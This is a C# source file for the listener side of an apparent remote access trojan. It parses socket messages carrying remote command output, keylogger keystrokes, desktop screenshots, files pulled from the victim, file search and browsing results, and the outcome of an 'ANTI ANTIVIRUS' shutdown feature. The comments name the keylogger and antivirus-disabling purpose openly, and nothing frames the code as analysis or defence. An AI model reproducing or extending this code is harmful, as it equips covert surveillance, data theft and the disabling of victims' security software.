using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms ;
using System.Drawing;
using System.IO;
using System.ComponentModel;

namespace ConsoleApplication4
{
    public class Listener
    {
        private Socket s;
      
        private bool continueListen = true;
        private AutoResetEvent cmdEvent;
        private AutoResetEvent deskEvent;
        private AutoResetEvent floatVarEvent;
        private AutoResetEvent fileNamesEvent;
        private AutoResetEvent keyStatEvent;
        private AutoResetEvent livekeyEvent;
        private AutoResetEvent speakEvent;
        private AutoResetEvent speakSettingsEvent;
        private AutoResetEvent navSettingsEvent;
        private AutoResetEvent findResultEvent;
        private AutoResetEvent findResultVirusEvent; 

        private Object ob = new Object();
        private Object ob1 = new Object();
        private Object ob2 = new Object();

        // information holders 
        private String cmd="";
        private List<Bitmap> pics = new List<Bitmap>();
        private float f = 0f ;

        // Keylogger stuff
        private String fileNames="";
        private String KeyStat = "";
        private String LiveKey = ""; 

        // file transfer stuff 
        private long filesize=0;
        private FileStream fs; 

        // speak stuff
        private String voices="" ;
        private String speakSettings = ""; 

        //file navigate stuff 
        private String navSettings = ""; 

        // Search Files BULK stuff 
        private String findResult = ""; 

        // ANTI ANTIVIRUS  stuff
        private String findResultVirus = ""; 
 
        public Listener(Socket s)
        {
            cmdEvent = new AutoResetEvent(false);   
            deskEvent = new AutoResetEvent(false);
            floatVarEvent = new AutoResetEvent(false);
            fileNamesEvent = new AutoResetEvent(false);
            keyStatEvent = new AutoResetEvent(false);
            livekeyEvent = new AutoResetEvent(false);
            speakEvent = new AutoResetEvent(false);
            speakSettingsEvent = new AutoResetEvent(false);
            navSettingsEvent = new AutoResetEvent(false);
            findResultEvent = new AutoResetEvent(false);
            findResultVirusEvent = new AutoResetEvent(false);
            this.s = s;
        }



        public String cmdOutput(){
          String ch ; 
            if (cmd.Length == 0)
            {
                cmdEvent.WaitOne(); 
            }
          lock (ob){ 
             ch = cmd;
                cmd = "";
           }
            return ch ; 
        }

        public String[] fileNmaesOut() { // THINk , output already exist 
            while (fileNames == "") {
                fileNamesEvent.WaitOne(); 
            }
            fileNames.TrimEnd('\n');
            

            if (fileNames.Length == 0) {
                return null; 
            }
            
            return fileNames.Split('\n');
        }

        public Bitmap picOutput() {
            while (pics.Count == 0)
            {   
                deskEvent.WaitOne(); 
            }
          
            Bitmap p = pics[0];
            pics.RemoveAt(0);
            
            return p; 
        }
        public float floatOut() {
            while(f == 0){
                floatVarEvent.WaitOne(); 
            }
            float temp = f;
            f = 0F;
            return f; 
        }

        public String liveKey() {
            
            String temp ;
            lock (ob2)
            {
                 temp = LiveKey;
                LiveKey = "";
            }
            return temp; 
        }

        public String keyStatOuput(int timeout) { 
             if(KeyStat.Length == 0){
                 keyStatEvent.WaitOne(timeout); 
             }
             return KeyStat; 
        }

        public int getProgesspercent() {
            if (fs != null)
            {   
               
                int progress = 0; 
                try{
                    progress = (int)( ((double)fs.Length /(double)filesize) * 100 ) ;
                }catch{
                    progress = 100;  // assuming the file got closed and finished  
                }
                
                return progress;

            }
            else {
                return 0; 
            }
        }

        // speak 
        public bool checkSpeak() {
            return voices.Length != 0; 
        }
        public String VoicesOut() {
            while (voices.Length == 0) {
                speakEvent.WaitOne(); 
            }
            return voices; 
        }

        public String speakSettingsOut() {
            while (speakSettings.Length == 0)
            {
                speakSettingsEvent.WaitOne();
            }
            String a = speakSettings;
            speakSettings = "";
            return a; 
        }

        // navigate files 
          public String navSettingsOut() {
            while (navSettings.Length == 0)
            {
                navSettingsEvent.WaitOne();
            }
            String a = navSettings;
            navSettings = "";
            navSettingsEvent = new AutoResetEvent(false);

            return a; 
        }

          // search for file
          public async Task<String> findResultOut()
          {     
              while (findResult.Length == 0)
              {
                  findResultEvent.WaitOne();
              }
              String a = findResult;
              findResult = "";
              findResultEvent = new AutoResetEvent(false);

              return a;
          }
        
        // Get ANTIVIRUS SHUTDOWN RESULT 
          public async Task<String> findResultVirusOut()
          {
              while (findResultVirus.Length == 0)
              {
                  findResultVirusEvent.WaitOne();
              }
              String a = findResultVirus;
              findResult = "";
              findResultVirusEvent = new AutoResetEvent(false);

              return a;
          }



        /// <summary>
        ///  Real stuff 
        /// </summary>
        public void listen()
        { try{
            do
            {   
               
                UTF8Encoding asen = new UTF8Encoding();
                byte[] b1 = new byte[4]; 
                byte[] b = new byte[10000];
                 int length ;
                int k = 0;
                    int k1 = s.Receive(b1,4,SocketFlags.None); 
                    length = BitConverter.ToInt32(b1, 0);
                    using (MemoryStream m = new MemoryStream())
                    {
                        while (length > 0)
                        {
                            int size = (length < b.Length) ? length : b.Length; 

                            k = s.Receive(b,size,SocketFlags.None);
                            m.Write(b, 0, k);
                            length -= k;
                            
                        }


                        b = m.ToArray()  ; 
                    }
                        String a = asen.GetString(new byte[]{b[0],b[1]});
                        b = b.Skip(2).ToArray<byte>();
                        
                        switch (a)
                        {
                            case "00": // string   (cmd output)

                                lock (ob)
                                {
                                    cmd += asen.GetString(b);
                                }
                                cmdEvent.Set();
                                break;
                            // key logger start 
                            case "03" : // receive file names 
                                fileNames = asen.GetString(b)+"\n";
                                fileNamesEvent.Set();
                                break; 
                            case "a1" : // receive etat String 
                                KeyStat = asen.GetString(b);
                                keyStatEvent.Set();
                                break;
                            case "l1" :
                                lock(ob2){
                                    LiveKey += asen.GetString(b);
                                }
                                 
                                
                                break;

                            // DESKTOP 
                            case "04": // receiving pics
                                lock (ob1){
                                    TypeConverter tc = TypeDescriptor.GetConverter(typeof(Bitmap));
                                    pics.Add ((Bitmap)tc.ConvertFrom(b) ) ;
                                    deskEvent.Set(); 
                                }
                                break; 
                            case "f5" :  // float (desktop ration )
                                f=(float)BitConverter.ToDouble(b,0);
                                floatVarEvent.Set();     
                                break;
                        
                            
                            //BEGIN file transfer 
                               case "s0" : // receive header 
                                fileNames = asen.GetString(b);
                                String[] fileinfo = fileNames.Split(':');
                                filesize = long.Parse(fileinfo[1]);
                                
                                fs = new FileStream(fileinfo[0],FileMode.Create,FileAccess.Write);
                                  
                                break; 

                            case "s1" : // receive file   
                                fs.WriteAsync(b,0,b.Length);
                                break; 
                            case "s2" :
                                // if(fs.Length < filesize)  TODO  :  lost data handel  
                                fs.Close();
                                break; 
                            // Speak 
                            case "i7" :
                                voices = asen.GetString(b);
                                speakEvent.Set();
                                break;  
                            case "e7" :
                                speakSettings = asen.GetString(b);
                                speakSettingsEvent.Set();
                                break; 
                                
                            // navigate files 
                            case "08" :  
                            case "92" : 
                            case "93" :
                            case "98" :
                             
                                navSettings = asen.GetString(b);
                                navSettingsEvent.Set();
                                break ;

                            case "s9" :
                                findResult = asen.GetString(b);
                                findResultEvent.Set(); 
                                break;
                            case "v9":
                                findResultVirus = asen.GetString(b);
                                findResultVirusEvent.Set();
                                break; 
                        }
                   
                Thread.Sleep(100)  ; 
            } while (continueListen);
            }catch{}
        }

        
    }
}
